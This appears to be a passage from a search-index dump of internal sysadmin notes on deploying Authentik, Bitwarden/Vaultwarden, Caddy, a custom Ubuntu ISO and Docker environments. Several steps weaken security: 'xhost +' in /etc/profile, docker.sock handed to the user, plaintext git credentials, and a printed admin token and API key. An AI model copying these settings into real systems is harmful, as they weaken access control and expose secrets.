(HTTPS).</p> <p>To start the initial setup, navigate to <code>https://&lt;your server's IP or hostname&gt;:9000/if/flow/initial-setup/</code>.</p> <p>There you are prompted to set a password for the akadmin user (the default user).</p>"},{"location":"Authentik/authetikDoc/#explanation","title":"Explanation","text":"<p>DANGER</p> <p>The server assumes to have local timezone as UTC. All internals are handled in UTC; whenever a time is displayed to the user in UI it gets localized. Do not update or mount <code>/etc/timezone</code> or <code>/etc/localtime</code> in the authentik containers. This will not give any advantages. On the contrary, it will cause problems with OAuth and SAML authentication, e.g. see this GitHub issue.</p> <p>The Docker-Compose project contains the following containers:</p> <ul> <li>server</li> </ul> <p>This is the backend service, which does all the logic, plus runs the API and the SSO functionality. It also runs the frontend, hosts the JS/CSS files, and serves the files you've uploaded for icons/etc.</p> <ul> <li>worker</li> </ul> <p>This container executes background tasks, everything you can see on the System Tasks page in the frontend.</p> <ul> <li> <p>redis (for cache)</p> </li> <li> <p>postgresql (default database)</p> </li> </ul>"},{"location":"Authentik/docker-compose/","title":"Docker compose","text":"<pre><code>## modified compose\n---\nversion: '3.4'\n\nservices:\n  postgresql:\n    image: docker.io/library/postgres:12-alpine\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -d $${POSTGRES_DB} -U $${POSTGRES_USER}\"]\n      start_period: 20s\n      interval: 30s\n      retries: 5\n      timeout: 5s\n    volumes:\n      - database:/var/lib/postgresql/data\n    environment:\n      - POSTGRES_PASSWORD=${PG_PASS:?database password required}\n      - POSTGRES_USER=${PG_USER:-authentik}\n      - POSTGRES_DB=${PG_DB:-authentik}\n    command: \"-p 5555\"\n    env_file:\n      - .env\n    networks:\n      - caddy\n  redis:\n    image: docker.io/library/redis:alpine\n    command: --save 60 1 --loglevel warning\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"redis-cli ping | grep PONG\"]\n      start_period: 20s\n      interval: 30s\n      retries: 5\n      timeout: 3s\n    volumes:\n      - redis:/data\n    networks:\n      - caddy\n  server:\n    image: ${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2023.3.1}\n    restart: unless-stopped\n    command: server\n    environment:\n      AUTHENTIK_REDIS__HOST: redis\n      AUTHENTIK_POSTGRESQL__HOST: postgresql\n      AUTHENTIK_POSTGRESQL__PORT: 5555\n      AUTHENTIK_POSTGRESQL__USER: ${PG_USER:-authentik}\n      AUTHENTIK_POSTGRESQL__NAME: ${PG_DB:-authentik}\n      AUTHENTIK_POSTGRESQL__PASSWORD: ${PG_PASS}\n    volumes:\n      - ./media:/media\n      - ./custom-templates:/templates\n    env_file:\n      - .env\n    ports:\n      - \"${AUTHENTIK_PORT_HTTP:-9000}:9000\"\n      - \"${AUTHENTIK_PORT_HTTPS:-9443}:9443\"\n    networks:\n      - caddy\n  worker:\n    image: ${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2023.3.1}\n    restart: unless-stopped\n    command: worker\n    environment:\n      AUTHENTIK_REDIS__HOST: redis\n      AUTHENTIK_POSTGRESQL__HOST: postgresql\n      AUTHENTIK_POSTGRESQL__PORT: 5555\n      AUTHENTIK_POSTGRESQL__USER: ${PG_USER:-authentik}\n      AUTHENTIK_POSTGRESQL__NAME: ${PG_DB:-authentik}\n      AUTHENTIK_POSTGRESQL__PASSWORD: ${PG_PASS}\n    # `user: root` and the docker socket volume are optional.\n    # See more for the docker socket integration here:\n    # https://goauthentik.io/docs/outposts/integrations/docker\n    # Removing `user: root` also prevents the worker from fixing the permissions\n    # on the mounted folders, so when removing this make sure the folders have the correct UID/GID\n    # (1000:1000 by default)\n    user: root\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - ./media:/media\n      - ./certs:/certs\n      - ./custom-templates:/templates\n    env_file:\n      - .env\n    networks:\n      - caddy\n\nvolumes:\n  database:\n    driver: local\n  redis:\n    driver: local\nnetworks:\n  caddy:\n    external: true\n</code></pre>"},{"location":"Azure/Git%20Codes/","title":"Git Codes","text":"<p>https://github.com/Azure/Microsoft-Defender-for-Cloud/tree/main/Powershell%20scripts</p>"},{"location":"Bitwarden/Install/","title":"Install","text":"<ol> <li>Download the Bitwarden installation script (<code>bitwarden.sh</code>) to your machine:</li> </ol> <p><code>curl -Lso bitwarden.sh https://go.btwrdn.co/bw-sh &amp;&amp; chmod 700 bitwarden.sh</code></p> <ol> <li>Run the installer script. A <code>./bwdata</code> directory will be created relative to the location of <code>bitwarden.sh</code>.</li> </ol> <p><code>./bitwarden.sh install</code></p> <ol> <li> <p>Complete the prompts in the installer:</p> </li> <li> <p>Enter the domain name for your Bitwarden instance:</p> <p>Typically, this value should be the configured DNS record.</p> </li> <li> <p>Do you want to use Let's Encrypt to generate a free SSL certificate? (y/n):</p> <p>Specify <code>y</code> to generate a trusted SSL certificate using Let's Encrypt. You will be prompted to enter an email address for expiration reminders from Let's Encrypt. For more information, see Certificate Options.</p> <p>Alternatively, specify <code>n</code> and use the Do you have a SSL certificate to use? option.</p> </li> <li> <p>Enter your installation id:</p> <p>Retrieve an installation id using a valid email at https://bitwarden.com/host. For more information, see What are my installation id and installation key used for?.</p> </li> <li> <p>Enter your installation key:</p> <p>Retrieve an installation key using a valid email at https://bitwarden.com/host. For more information, see What are my installation id and installation key used for?.</p> </li> <li> <p>Do you have a SSL certificate to use? (y/n):</p> <p>If you already have your own SSL certificate, specify <code>y</code> and place the necessary files in the <code>./bwdata/ssl/your.domain</code> directory. You will be asked whether it is a trusted SSL certificate (y/n). For more information, see Certificate Options.</p> <p>Alternatively, specify <code>n</code> and use the self-signed SSL certificate? option, which is only recommended for testing purposes.</p> </li> <li> <p>Do you want to generate a self-signed SSL certificate? (y/n):</p> <p>Specify <code>y</code> to have Bitwarden generate a self-signed certificate for you. This option is only recommended for testing. For more information, see Certificate Options.</p> <p>If you specify <code>n</code>, your instance will not use an SSL certificate and you will be required to front your installation with a HTTPS proxy, or else Bitwarden applications will not function properly.</p> </li> </ol> <p>\ue904</p>"},{"location":"Bitwarden/Install/#post-install-configuration","title":"Post-Install Configuration","text":"<p>Configuring your environment can involve making changes to two files; an environment variables file and an installation file:</p>"},{"location":"Bitwarden/Install/#environment-variables-required","title":"Environment Variables (Required)","text":"<p>Some features of Bitwarden are not configured by the <code>bitwarden.sh</code> script. Configure these settings by editing the environment file, located at <code>./bwdata/env/global.override.env</code>. At a minimum, you should replace the values for:</p> <pre><code>...\nglobalSettings__mail__smtp__host=&lt;placeholder&gt;\nglobalSettings__mail__smtp__port=&lt;placeholder&gt;\nglobalSettings__mail__smtp__ssl=&lt;placeholder&gt;\nglobalSettings__mail__smtp__username=&lt;placeholder&gt;\nglobalSettings__mail__smtp__password=&lt;placeholder&gt;\n...\nadminSettings__admins=\n...\n</code></pre> <p>Replacing <code>globalSettings__mail__smtp...=</code> placeholder will configure the SMTP Mail Server that will be used to send verification emails to new users and invitations to Organizations. Adding an email address to <code>adminSettings__admins=</code> will provision access to the Admin Portal.</p> <p>After editing <code>global.override.env</code>, run the following command to apply your changes:</p> <pre><code>./bitwarden.sh restart\n</code></pre>"},{"location":"Bitwarden/Install/#installation-file","title":"Installation File","text":"<p>The Bitwarden installation script uses settings in <code>./bwdata/config.yml</code> to generate the necessary assets for installation. Some installation scenarios (e.g. installations behind a proxy with alternate ports) may require adjustments to <code>config.yml</code> that were not provided during standard installation.</p> <p>Edit <code>config.yml</code> as necessary and apply your changes by running:</p> <pre><code>./bitwarden.sh rebuild\n</code></pre> <p>\ue904</p>"},{"location":"Bitwarden/Install/#start-bitwarden","title":"Start Bitwarden","text":"<p>Once you've completed all previous steps, start your Bitwarden instance:</p> <pre><code>./bitwarden.sh start\n</code></pre>"},{"location":"Bitwarden/Vaultwarden/","title":"Instalaci\u00f3n de Vaultwarden en Docker","text":"<p>Posted on November 13, 2022</p> <p>Vaultwarden es una implementaci\u00f3n alternativa de la API de Bitwarden, un gestor de contrase\u00f1as de c\u00f3digo abierto.</p> <p>Al estar escrita en Rust, necesita mucho menos recursos que la instalaci\u00f3n de Bitwarden en Docker por lo que puede funcionar incluso en una Raspberry Pi 4.</p> <p>La instalaci\u00f3n de Vaultwarden en Docker se realiza usando la imagen <code>vaultwarden/server</code>.</p> <p>La forma m\u00e1s sencilla de hacerlo es usando un fichero <code>docker-compose.yml</code> con el siguiente contenido:</p> <pre><code>version: '3'\nservices:\n  vaultwarden:\n    image: vaultwarden/server:latest\n    container_name: vaultwarden\n    environment:\n      TZ: 'Europe/Madrid'\n      DOMAIN: 'https://vault.mydomain.com/'\n    volumes:\n      - ~/volumes/vaultwarden:/data\n    restart: unless-stopped\nnetworks:\n  default:\n    external: true\n    name: nginxpm_network\n</code></pre> <p>Nota: N\u00f3tese que no se expone ning\u00fan puerto al Docker host y que se utiliza la misma red que Nginx Proxy Manager.</p> <p>Para iniciar el contenedor, se puede usar <code>docker-compose up -d</code> o usar el contenido del fichero anterior en Portainer.</p>"},{"location":"Bitwarden/Vaultwarden/#pre-requisitos","title":"Pre-requisitos","text":"<p>Antes de poder acceder a Vaultwarden para configurarlo es necesario:</p> <ul> <li>Crear un registro DNS de tipo A en Cloudflare: <code>vault.mydomain.com</code> \u2192 192.168.1.180</li> </ul> <p></p> <ul> <li>Crear un certificado SSL de Let\u2019s Encrypt para el hostname anterior</li> </ul> <p></p> <ul> <li>Crear un proxy host para el hostname anterior: <code>vault.mydomain.com</code> \u2192 <code>http://vaultwarden:80</code></li> </ul> <p></p>"},{"location":"Bitwarden/Vaultwarden/#configuracion","title":"Configuraci\u00f3n","text":"<p>Una vez en marcha, se puede acceder a Vaultwarden a trav\u00e9s de <code>HTTPS</code> usando Nginx Proxy Manager (en este ejemplo <code>https://vault.mydomain.com/</code>) y comenzar la configuraci\u00f3n.</p> <p>El primer paso consiste en crear una nueva cuenta de usuario para acceder al vault pulsando en el bot\u00f3n <code>Create Account</code>:</p> <ul> <li>Email Address: <code>vaultwarden@mydomain.com</code></li> <li>Name: <code>Manel</code></li> <li>Master Password: <code>*********</code></li> <li>Re-type Master Password: <code>*********</code></li> <li>Master Password Hint (optional): <code>Pista</code></li> </ul> <p>Si el usuario se crea correctamente, se podr\u00e1 iniciar sesi\u00f3n con el mismo y ver la siguiente pantalla:</p> <p></p> <p>Nota: Es aconsejable crear todos los usuarios que se necesiten en este momento y as\u00ed se puede deshabilitar el registro de usuarios para aumentar la seguridad.</p>"},{"location":"Bitwarden/Vaultwarden/#habilitar-admin-panel","title":"Habilitar Admin Panel","text":"<p>Para habilitar la p\u00e1gina de administraci\u00f3n hay que realizar lo siguiente:</p> <ul> <li>Ejecutar el comando <code>openssl rand -base64 48</code> para generar un token aleatorio:</li> </ul> <pre><code>U543Xx6Bhj+uiv9DhNDcAExM9Cef2C644CC7wwFGUh7Z4I6OvOEaYZaxjnrrKZYX\n</code></pre> <ul> <li>Agregar la variable <code>ADMIN_TOKEN</code> al fichero <code>docker-compose.yml</code>:</li> </ul> <pre><code>    environment:\n      ADMIN_TOKEN: 'U543Xx6Bhj+uiv9DhNDcAExM9Cef2C644CC7wwFGUh7Z4I6OvOEaYZaxjnrrKZYX'\n</code></pre> <ul> <li>Acceder al Vaultwarden Admin Panel a trav\u00e9s de <code>https://vault.mydomain.com/admin</code>:</li> </ul> <p></p> <p>Nota: La primera vez que se guarde la configuraci\u00f3n, se generar\u00e1 el fichero <code>/data/config.json</code>. Este fichero tiene preferencia sobre las variables indicadas en <code>docker-compose.yml</code>.</p> <p>Nota: Tambi\u00e9n se podr\u00eda haber activado el Admin Panel creando o modificando el fichero <code>/data/config.json</code> a\u00f1adiendo la variable <code>admin_token</code> tal como se muestra a continuaci\u00f3n:</p> <pre><code>{\n  \"admin_token\": \"U543Xx6Bhj+uiv9DhNDcAExM9Cef2C644CC7wwFGUh7Z4I6OvOEaYZaxjnrrKZYX\"\n}\n</code></pre> <p>Algunos valores interesantes a configurar:</p> <ul> <li>General settings</li> <li>Domain URL: <code>https://vault.mydomain.com/</code></li> <li>Trash auto-delete days: <code>90</code></li> <li>Allow new signups: <code>Disable</code></li> <li>Org creation users: <code>vaultwarden@mydomain.com</code></li> <li>Allow invitations: <code>Disable</code></li> <li>Advanced settings</li> <li>Yubikey settings</li> <li>Global Duo settings</li> <li>SMTP Email Settings</li> <li>Email 2FA Settings</li> <li>Read-Only Config</li> <li>Backup Database</li> </ul> <p>Nota: Una vez se haya configurado el entorno, es recomendable deshabilitar el Admin Panel. Para ello hay que eliminar la variable de entorno <code>ADMIN_TOKEN</code> y asegurarse que no exista la variable <code>admin_token</code> en el fichero <code>/data/config.json</code>.</p>"},{"location":"Bitwarden/Vaultwarden/#actualizar","title":"Actualizar","text":"<p>Si ya se hab\u00eda instalado Vaultwarden anteriormente, se puede actualizar de la siguiente manera:</p> <pre><code>docker stop vaultwarden\ndocker rm vaultwarden\ndocker rmi vaultwarden/server\ndocker-compose up -d\n</code></pre>"},{"location":"Bitwarden/Vaultwarden/#soporte","title":"Soporte","text":"<p>Algunos comandos para gestionar la configuraci\u00f3n del contenedor:</p> <pre><code># Acceder al shell mientras el contenedor est\u00e1 ejecut\u00e1ndose\ndocker exec -it vaultwarden /bin/bash\n\n# Monitorizar los logs del contenedor en tiempo real\ndocker logs -f vaultwarden\n\n# Obtener la versi\u00f3n de Vaultwarden\ndocker exec vaultwarden /vaultwarden --version\n</code></pre>"},{"location":"Caddy/caddyDoc/","title":"caddyDoc","text":"<pre><code>version: \"3.9\"\n\nservices:\n  caddy:\n    image: caddy\n    container_name: caddy\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    networks:\n      - caddy\n    volumes:\n      - ./Caddyfile:/etc/caddy/Caddyfile:ro\n      - caddy_data:/data\n      - caddy_config:/config\nvolumes:\n  caddy_data:\n  caddy_config:\nnetworks:\n  caddy:\n    external: true\n</code></pre> <pre><code>#Caddyfile\n\nmongo.bluetrailsoft.tk {\n    reverse_proxy mongo_express:8081\n}\n\nportainer.bluetrailsoft.tk {\n    reverse_proxy portainer:9000\n}\n\ntest.bluetrailsoftutils {\n    reverse_proxy netdata:19999\n}\n</code></pre>"},{"location":"Cubic/Cubic/","title":"Custom Distribution Docs","text":""},{"location":"Cubic/Cubic/#how-to-create-ubuntu-2204-custom-with-alg","title":"How to create Ubuntu 22.04 custom with ALG.","text":"<p>What do we need?</p> <p>The first thing to know is that this tool has been designed to be used on an Ubuntu operating system. So we must have a version of Ubuntu installed on our system.</p> <p>\u00b7     Cubic (Github Official Repo)</p> <p>o  Guide (https://ostechnix.com/how-to-create-a-custom-ubuntu-live-iso-image-with-cubic/)</p> <p>\u00b7     ISO Ubuntu 22.04 (https://www.releases.ubuntu.com/22.04/ubuntu-22.04.2-desktop-amd64.iso)</p> <p>\u00b7     Ubuntu 22.04 LTS (Jammy Jellyfish) complete sources.list (**https://gist.github.com/hakerdefo/9c99e140f543b5089e32176fe8721f5f **)</p> <p>\u00b7     Installation steps (Vanilla Ubuntu setup )</p> <p>Once we have all these elements at our disposal, we will proceed to create our distribution.</p> <p>Step 0</p> <p>\u00b7     We will open our previously installed Cubic application.</p> <p></p> <p>Step 1</p> <p>The first screen we are shown is the place where we are going to save our project and ISO image.</p> <p></p> <p>Once you have selected the folder where our information will be stored, click on the top button that says next.</p> <p>Step 2</p> <p></p> <p>As we can see in this screen we have two types of information which we can modify. On the left side we have the information contained in the official Ubuntu image, and on the right side the information that will be saved in our custom image. It is advisable to change some of these attributes to be able to differentiate the images in the future, as it is likely that different versions will be released. The fields that most differentiate the images are: Version, Release and Filename. Once we have modified the necessary fields we proceed with the following button.</p> <p></p> <p>Step 3:</p> <p>We proceed to modify the source.list since the default one is limited. We will modify the content of the file here <code>/etc/apt/sources.list</code></p> <pre><code>sudo nano /etc/apt/sources.list\n</code></pre> <p></p> <p>With this step done, we will start the complete step-by-step installation of ALG until we reach point 4.</p> <p>Step 4</p> <p>Note: In the installation you will see this message each time you use <code>sudo</code> \u201csudo: unable to resolve host cubic: Temporary failure in name resolution\u201c No matter, everything is fine.</p> <p>From step 4 onwards the installation varies a bit. I leave the modified steps below.</p>"},{"location":"Cubic/Cubic/#4-install-vimba-teamviewer-ffmpeg-git-wmctrl-and-ansible","title":"4 Install Vimba, Teamviewer, FFMPEG, Git, wmctrl and Ansible","text":"<pre><code># Download vimba software from https://www.alliedvision.com/en/products/vimba-sdk/#c1497\ncd /etc/skel\ncurl -L https://downloads.alliedvision.com/Vimba64_v6.0_Linux.tgz &gt; Vimba64_v6.0_Linux.tgz\ntar -xzf Vimba64_v6.0_Linux.tgz -C /etc/skel\n\n# TEAMVIEWER\ncd /tmp\nwget https://download.teamviewer.com/download/linux/signature/TeamViewer2017.asc\nsudo apt-key add TeamViewer2017.asc\nsudo sh -c 'echo \"deb http://linux.teamviewer.com/deb stable main\" &gt;&gt; /etc/apt/sources.list.d/teamviewer.list'\nsudo apt update\nsudo apt install -y teamviewer\n\n# Install FFMPEG\nsudo apt install -y ffmpeg\nsudo apt install -y net-tools\nsudo apt update &amp;&amp; sudo apt upgrade -y\n\n# Install Git\nsudo apt install -y git\n\n# Install wmctrl\nsudo apt install -y wmctrl\n</code></pre>"},{"location":"Cubic/Cubic/#5-enable-xhost","title":"5 Enable xhost +","text":"<pre><code># Execute only once\nsudo echo \"xhost +\" &gt;&gt; /etc/profile\n</code></pre>"},{"location":"Cubic/Cubic/#6-repositories-setup","title":"6 Repositories setup","text":"<pre><code># We need to add credentials in first instalation.\n## Set vault\nsudo git config --global credential.helper store\n## Set vault in root folder\nsudo git config --global credential.helper \"store --file /root/.git-credentials\"\n# Repositories setup\nmkdir /etc/skel/alg-repositories\ncd /etc/skel/alg-repositories\n\n# input username and password for gitlab\n# Complete command with credentials in https://brooklynlab.atlassian.net/wiki/spaces/A/pages/16973825/Mega+computer+credentials#BTS-repository-user\nsudo git clone https://username:password@git.jolibrain.com/cartier/cartier_lg_web.git\n\n# input username and password for gitlab when asked\n# Complete command with credentials in https://brooklynlab.atlassian.net/wiki/spaces/A/pages/16973825/Mega+computer+credentials#BTS-repository-user\nsudo git clone https://username:password@gitlab.com/cartier-lab/megacomputer-scripts.git\n\n# input username and password for gitlab when asked\n# Complete command with credentials in https://brooklynlab.atlassian.net/wiki/spaces/A/pages/16973825/Mega+computer+credentials#BTS-repository-user\nsudo git clone https://username:password@gitlab.com/cartier-lab/mc-playbooks.git\n</code></pre>"},{"location":"Cubic/Cubic/#7-disable-automatic-updates-via-command-line","title":"7 Disable Automatic Updates via Command Line","text":"<p>Update preferences are stored in the <code>/etc/apt/apt.conf.d/20auto-upgrades</code> file. Open it with nano or your favorite text editor to make some changes to it.</p> <pre><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades\n</code></pre> <p>To disable automatic updates completely, make sure all these directives are set to \u201c0\u201d. When done, save your changes and exit the file.</p> <pre><code>APT::Periodic::Update-Package-Lists \"0\";\nAPT::Periodic::Download-Upgradeable-Packages \"0\";\nAPT::Periodic::AutocleanInterval \"0\";\nAPT::Periodic::Unattended-Upgrade \"0\";\n</code></pre>"},{"location":"Cubic/Cubic/#8-create-script-first-start","title":"8 Create script \u201cFirst Start\u201c","text":"<pre><code>cd /etc/skel\ntouch first_start.sh\nsudo chmod +x first_start.sh\nnano first_start.sh\n# Add content that appear below.\n#!/bin/bash\n\n# Check if the current user is root or has sudo privileges\nif [[ $EUID -ne 0 ]]; then\n    echo \"This script must be run as root or with sudo privileges\"\n    exit 1\nfi\nset -e\n# Sequence of commands you want to run\n# Install Vimba\nvimba=$(find /home -type d -name VimbaUSBTL)\ncd $vimba\nsudo ./Uninstall.sh\nsudo ./Install.sh\n# Login in registries\nsudo docker login registry.gitlab.com\nsudo docker login https://cartierdocker.deepdetect.com\n# Give permission to Docker\nsudo usermod -aG docker $SUDO_USER\nsudo chown -R $SUDO_USER /var/run/docker.sock\nsudo chown -R $SUDO_USER /usr/local/bin/docker-compose\n# Disable ipv6\nsudo sysctl net.ipv6.conf.all.disable_ipv6=1\n#find repos\n#alg_backend=$(find /home -type d -name alg-backend)\nmegacomputer_scripts=$(find /home -type d -name megacomputer-scripts)\ncartier_lg_web=$(find /home -type d -name cartier_lg_web)\nstandalone=$(find /home -type d -name standalone_setup_realtime)\nalg=$(find /home -type d -name alg-repositories)\n# Add safe directory\nsudo git config --global --add safe.directory $megacomputer_scripts\n#sudo git config --global --add safe.directory $alg_backend\nsudo git config --global --add safe.directory $cartier_lg_web\n\n## Setup default version alg\n# Permission to alg directory\nsudo chown -R $USER $alg\n# Define VARS\nexport DATA_ROOT_PATH=/data/cartier/cartier_realtime_data\nexport COMPOSE_UID=$(id -u)\nexport COMPOSE_GUID=$(id -g)\ncd $standalone\nsudo docker-compose up -d\n# Copy alg files into jolibrain\ncp $megacomputer_scripts/config/nginx.conf $cartier_lg_web/docker/standalone_setup_realtime/config/nginx\ncp $megacomputer_scripts/config/docker-compose.yml $cartier_lg_web/docker/standalone_setup_realtime\ncp $megacomputer_scripts/config/.env_api_backend $cartier_lg_web/docker/standalone_setup_realtime\ncp $megacomputer_scripts/config/.env_postgres $cartier_lg_web/docker/standalone_setup_realtime\ncp $megacomputer_scripts/config/.env_elastic $cartier_lg_web/docker/standalone_setup_realtime\ncp $megacomputer_scripts/config/filebeat.yml $cartier_lg_web/docker/standalone_setup_realtime/config\ncp $megacomputer_scripts/config/logstash.conf $cartier_lg_web/docker/standalone_setup_realtime/config\n# Next start to apply alg changes\nsudo docker-compose up -d\n# Install\ncd $megacomputer_scripts\nsudo ./install.sh MEGA_COMPUTER 192.168.121.101 root root /data/cartier/cartier_realtime_data\nsudo apt autoremove -y\n# Programed restart\necho \"Press any key to cancel restart\"\nsleep 30\n\nif read -t 0; then\n  echo \"Restart canceled\"\nelse\n  echo \"Restarting...\"\n  shutdown -r now\nfi\n</code></pre> <p>When we have completed the full installation and all our files are inside our custom distribution, click next, don't worry if you forget any step you can always go back to modify the project.</p> <p>Step 5</p> <p></p> <p>Finally, click the generate button and the build process of your distribution will start.</p> <p></p> <p>To create an USB Live with generated ISO follow the steps on this tutorial:https://www.makeuseof.com/create-bootable-usb-drive-with-etcher-linux/</p>"},{"location":"Dockers/%23%20Full%20Environment%20dockerized/","title":"Full Environment dockerized","text":""},{"location":"Dockers/%23%20Full%20Environment%20dockerized/#requirements","title":"Requirements:","text":"<ul> <li>Repositories</li> <li>bts_internship_2019_fe_app - Branch: Docker/master<ul> <li>git@gitlab.bluetrail.software:bts-platform/bts_internship_2019_fe_app.git</li> </ul> </li> <li>mybts_fe - Branch: DT-301<ul> <li>git@gitlab.bluetrail.software:mybts-platform/mybts_fe.git</li> </ul> </li> <li>mybts_be - Branch: DT-283<ul> <li>git@gitlab.bluetrail.software:mybts-platform/mybts_be.git</li> </ul> </li> <li>Docker installed</li> <li>Keep free ports 80,3000,4200,5050,5433</li> <li>PgAdmin installed</li> </ul>"},{"location":"Dockers/%23%20Full%20Environment%20dockerized/#steps","title":"Steps:","text":"<p>Step 1: </p> <ul> <li>Download the repositories and checkout to specified branch.</li> </ul> <p>Step 2:</p> <ul> <li> <p>Add the env files inside specified folders.</p> </li> <li> <p>environment.prod.ts on bts_internship_2019_fe_app\\src\\environments\\environment.prod.ts</p> </li> </ul> <p><code>export const environment = {     production: false,     apiUrl: 'api',     url: 'http://localhost:3000/',     citiesApiUrl: 'https://autocomplete.travelpayouts.com',     managerIdRole: 1,     s3BucketUrl: 'https://s3.amazonaws.com/cdn.platform.bluetrail.software/prod/',   };</code></p> <ul> <li>.env.default on mybts_be/.env.default</li> </ul> <p>```   # Database config   DB_HOST=postgres   DB_USER=postgres   DB_PASSWORD=postgres   DB_NAME=postgres   DB_PORT=5433   DB_SCHEMA=public   TOKEN_SECRET=secret   TIME_DURATION=24   TIME_INTERVAL=hours   TIME_EXPIRATION=24:00:00   SECURITY_SALT=10   FRONT_HOST=http://localhost   MAX_ID_RANGE=2147483647</p> <p># Email credentials   MAIL_SENDER=no-reply@bluetrailsoft.com   MAIL_HOST=   MAIL_PORT=465   MAIL_USER=   MAIL_PASS=</p> <p>APP_PORT=3000   API_URL=http://back:3000</p> <p># AWS S3 Credentials   #S3_BUCKET=cdn.platform.bluetrail.software   #S3_FOLDER=dev   #AWS_ACCESS_KEY_ID=   #AWS_SECRET_ACCESS_KEY=   #AWS_REGION=us-east-1   #S3_FOLDER_BACKUP=platformBackups/dev_backups   #S3_PROJECT_FILES_FOLDER=dev</p> <p>S3_BUCKET=mybts-s3   S3_FOLDER=dev   AWS_ACCESS_KEY_ID=   AWS_SECRET_ACCESS_KEY=   AWS_REGION=us-east-2   S3_FOLDER_BACKUP=platformBackups/dev_backups   S3_PROJECT_FILES_FOLDER=projectFiles</p> <p>V2_TIME_DURATION=24   V2_TIME_INTERVAL=hours   V2_TIME_EXPIRATION=24:00:00</p> <p># Weather API   WEATHER_API_KEY = 134e7fd1f8e8a5365e270b8ad776300b   WEATHER_UPDATE_FREQUENCY = 1</p> <p># PROTECTED ID   MANAGER_ID_ROLE= 1   REDIRECT_URIS=[\"http://mybts.bluetrail.software/api/V2/module0/login/redirect\"]    # GOOGLE OAUTH 2.0 Credentials   CLIENT_ID=   PROJECT_ID=bts-platform-v2   AUTH_URI=https://accounts.google.com/o/oauth2/auth   TOKEN_URI=https://oauth2.googleapis.com/token   AUTH_PROVIDER_X509_CERT_URL=https://www.googleapis.com/oauth2/v3/certs   CLIENT_SECRET=   REDIRECT_URIS=[\"http://mybts.bluetrail.software/api/V2/module0/login/redirect\"]</p> <p>JAVASCRIPT_ORIGINS=[\"http://localhost:4200\",\"http://localhost\",\"https://dev.platform.bluetrail.software\",\"https://dev.platform.bluetrail.software:80\",\"http://dev.platform.bluetrail.software\",\"http://dev.platform.bluetrail.software:80\",\"http://mybts-qa.bluetrail.software\",\"https://mybts-qa.bluetrail.software\",http://mybts.bluetrail.software]</p> <p>```</p> <p>.env.production on mybts_fe/.env.production</p> <p><code>REACT_APP_CLIENT_ID=   REACT_APP_BACKEND=http://mybts.bluetrail.software   REACT_APP_PORT=80   REACT_APP_BACKEND_VERSION=/api/V2   REACT_APP_S3_FOLDER=dev   REACT_APP_S3_BUCKET=\"\"   REACT_APP_S3_ROOT=https://mybts-s3.s3.amazonaws.com</code></p> <p>Step 3:</p> <ul> <li>Launch build image from dockerfile in all repositories with specified names</li> <li>Legacy FE no needs build.</li> <li>BE build name: platform_be_local<ul> <li>With the terminal on the root repository folder execute: <code>docker build -t platform_be_local .</code></li> </ul> </li> <li>FE build name: mybts<ul> <li>With the terminal on the root repository folder execute: <code>docker build -t mybts .</code></li> </ul> </li> </ul> <p>Step 4:</p> <ul> <li>On bts_internship_2019_fe_app - Branch: Docker/master</li> <li>Launch docker-compose.yml with <code>docker-compose up -d</code></li> </ul> <p>Step 5:</p> <ul> <li>Register your local server on PgAdmin</li> <li>Register<ul> <li>Name: \"local\"</li> </ul> </li> <li> <p>Connection</p> <ul> <li>host: 127.0.0.1 or localhost</li> <li>port: 5433</li> <li>username: postgres</li> <li>password: postgres</li> <li>database: postgres</li> </ul> </li> <li> <p>Restore backup with pgadmin on schema public.</p> </li> <li>Go to database postgres</li> <li>Drop cascade schema public</li> <li>Create new schema public</li> <li>Restore UAT backup</li> <li>Go to permissions table and change name of the column description to name.</li> </ul> <p>Step 6:</p> <ul> <li>Add this lines on /etc/hosts or /system32/drivers/etc/hosts</li> </ul> <pre><code>127.0.0.1 mybts.bluetrail.software\n127.0.0.1:3000 legacy.test\nlocalhost mybts.bluetrail.software\n</code></pre> <p>Step 7:</p> <ul> <li>Test environment</li> <li>FE legacy -  http://legacy.test doesn't work ATM (Because database are not adapted)</li> <li>FE mybts - http://mybts.bluetrail.software/ Working</li> </ul>"},{"location":"Dockers/ALG-Nvidia/","title":"1 Install Nvidia Drivers","text":"<pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt install -y build-essential libglvnd-dev pkg-config\n\n# Note: These gcc versions will change according your kernel version.\n# For utuntu 22.04, it's gcc-11 g++-11 and not the suggested 7.\n\nsudo apt -y install gcc-7 g++-7 gcc-8 g++-8 gcc-9 g++-9\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 7\nsudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-7 7\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 8\nsudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-8 8\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 9\nsudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 9\n\n# nvidia driver needs gcc 7, run the command and choose gcc version 7\nsudo update-alternatives --config gcc\n\n# nvidia driver needs g++ 7, run the command and choose g++ version 7\nsudo update-alternatives --config g++\n\n# verify gcc version\ngcc --version\n# Sample output\ngcc (Ubuntu 7.5.0-6ubuntu2) 7.5.0\nCopyright (C) 2017 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n\n# verify g++ version\ng++ --version\n# Sample output\ng++ (Ubuntu 7.5.0-6ubuntu2) 7.5.0\nCopyright (C) 2017 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n\n# if add-apt repository takes too long, run this comand before hand\nsudo sysctl net.ipv6.conf.all.disable_ipv6=1\nsudo add-apt-repository ppa:graphics-drivers/ppa -y\nsudo apt update &amp;&amp; sudo apt upgrade -y\nubuntu-drivers devices\n#####\n== 